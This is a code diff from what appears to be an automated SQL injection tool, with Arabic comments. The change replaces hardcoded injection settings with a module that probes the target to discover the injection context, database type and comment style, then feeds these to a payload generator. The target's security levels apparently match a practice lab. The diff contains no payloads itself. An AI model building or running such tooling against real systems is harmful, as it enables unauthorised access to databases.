@@ -50,11 +50,17 @@ def run_prometheus():
         print("[!] Failed to establish session.", flush=True)
         return
 
-    # المرحلة 3: التوجه للحقن (تعيين الإعدادات مباشرة بدون استكشاف)
-    print("[*] Stage: Strategy Setup...", flush=True)
-    inj_type = "QUOTELESS_STRING" # Default for Medium
-    db_type = "MySQL"
-    disable_quotes = True 
+    # المرحلة 3: اكتشاف السياق (Context Discovery)
+    print("[*] Stage: Smart Context Discovery...", flush=True)
+    discoverer = ContextDiscoverer(client, disable_strings=(target_security == "high"))
+    discovery_results = discoverer.discover()
+    
+    inj_type = discovery_results["context"]
+    db_type = discovery_results["db_type"]
+    comment_style = discovery_results.get("comment_style", "-- -")
+    disable_quotes = discovery_results.get("disable_strings", False)
+    
+    print(f"[*] Discovery Results: Context={inj_type}, DB={db_type}, Style={comment_style}", flush=True)
     
     print(f"[*] Targeting Target '{target_name}' @ {client.base_url}", flush=True)
     
@@ -142,7 +148,8 @@ def run_prometheus():
         context=inj_type, 
         disable_strings=disable_quotes,
         baseline=baseline_response,
-        target_name=target_name
+        target_name=target_name,
+        comment_style=comment_style
     )
     
     start_gen = island.current_gen
